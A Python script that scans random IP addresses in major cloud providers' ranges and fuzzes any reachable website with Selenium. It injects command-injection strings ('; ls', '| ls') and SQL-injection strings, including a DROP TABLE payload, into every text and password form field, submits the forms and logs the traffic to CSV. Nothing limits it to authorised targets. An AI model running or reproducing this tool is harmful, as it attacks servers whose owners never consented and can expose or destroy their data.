import csv
import time
import os
import random
import requests
import subprocess
from seleniumwire import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# Known IP ranges (AWS, Google Cloud, Azure, etc.)
KNOWN_IP_RANGES = [
    (13, 104, 0, 0, 13, 107, 255, 255),  # Azure
    (35, 160, 0, 0, 35, 191, 255, 255),  # Google Cloud
    (52, 0, 0, 0, 52, 63, 255, 255),     # AWS
    # Add more ranges as needed
]

def generate_ip_from_known_ranges():
    """Generate a random IP address within known IP ranges."""
    range_selection = random.choice(KNOWN_IP_RANGES)
    ip = f"{random.randint(range_selection[0], range_selection[4])}." \
         f"{random.randint(range_selection[1], range_selection[5])}." \
         f"{random.randint(range_selection[2], range_selection[6])}." \
         f"{random.randint(range_selection[3], range_selection[7])}"
    return ip

def ping_ip(ip, timeout=1):
    """Ping an IP address to check if it is reachable."""
    try:
        output = subprocess.run(['ping', '-c', '1', '-W', str(timeout), ip],
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return output.returncode == 0
    except Exception as e:
        print(f"[*] Ping failed for IP {ip}: {e}")
        return False

def is_server_reachable(url, timeout=5):
    """Check if the server at the given URL is reachable."""
    try:
        response = requests.head(url, timeout=timeout)
        return response.status_code == 200
    except requests.RequestException:
        return False

def log_request_response(request, response, data_writer):
    """Log request and response details to the CSV file."""
    try:
        req_query = getattr(request, 'query', '')
        req_body = request.body.decode() if request.body else ''
        res_body = response.body.decode() if response.body else ''
        
        data_writer.writerow({
            'req_method': request.method,
            'req_path': request.path,
            'req_query': req_query,
            'req_headers': str(request.headers),
            'req_body': req_body,
            'res_status': response.status_code,
            'res_headers': str(response.headers),
            'res_body': res_body,
            'ip': request.ip,
            'learned': False
        })
    except Exception as e:
        print(f"[*] Error while logging request/response: {e}")

def inject_payloads(driver, data_writer):
    """Inject payloads into form fields and submit them."""
    payloads = ['; ls', '| ls', "' OR '1'='1", "'; DROP TABLE users;--"]
    timeout = 10  # Maximum wait time in seconds

    try:
        forms = WebDriverWait(driver, timeout).until(EC.presence_of_all_elements_located((By.TAG_NAME, 'form')))
        for form in forms:
            inputs = form.find_elements(By.TAG_NAME, 'input')
            for input_element in inputs:
                if input_element.get_attribute('type') in ['text', 'password']:
                    for payload in payloads:
                        try:
                            input_element.clear()
                            input_element.send_keys(payload)
                            print(f"[*] Injected payload '{payload}' into input field.")
                            time.sleep(1)  # Allow time for payload injection
                            form.submit()
                            print(f"[*] Form submitted with payload '{payload}'.")

                            # Log the request/response after submission
                            for request in driver.requests:
                                response = request.response
                                log_request_response(request, response, data_writer)

                        except Exception as e:
                            print(f"[*] Error injecting payload: {e}")
                            continue
    except Exception as e:
        print(f"[*] Error discovering forms: {e}")

def crawl_and_fuzz(url):
    """Crawl and fuzz the URL with command injection and SQL injection payloads."""
    if not is_server_reachable(url):
        print(f"[*] Server at {url} is not reachable. Skipping...")
        return

    driver_path = "/Users/ananya/.wdm/drivers/chromedriver/mac64/127.0.6533.88/chromedriver"
    service = Service(driver_path)
    output_file = "crawl_and_fuzz_results.csv"

    csv.field_size_limit(10000000)

    options = Options()
    options.headless = True
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')

    driver = webdriver.Chrome(service=service, options=options)
    driver.set_page_load_timeout(10)

    file_exists = os.path.isfile(output_file)
    with open(output_file, 'a', newline='', encoding='utf-8') as csvfile:
        fieldnames = ['req_method', 'req_path', 'req_query', 'req_headers', 'req_body', 
                      'res_status', 'res_headers', 'res_body', 'ip', 'learned']
        data_writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
        
        if not file_exists:
            data_writer.writeheader()

        print(f"[*] Accessing web server: {url}")
        try:
            start_time = time.time()
            driver.get(url)
            time.sleep(3)

            inject_payloads(driver, data_writer)  # Inject payloads via POST requests

        except Exception as e:
            print(f"[*] Error crawling URL {url}: {e}")
            with open('error_log.txt', 'a', encoding='utf-8') as error_file:
                error_file.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - Error crawling URL {url}: {e}\n")

        finally:
            end_time = time.time()
            print(f"[*] Finished crawling in {end_time - start_time:.2f} seconds.")

    driver.quit()

if __name__ == "__main__":
    for _ in range(1000):  # Attempt to generate and test 1000 valid IPs
        random_ip = generate_ip_from_known_ranges()
        if ping_ip(random_ip):
            url = f"http://{random_ip}"
            crawl_and_fuzz(url)
        else:
            print(f"[*] IP {random_ip} is not reachable. Skipping...")
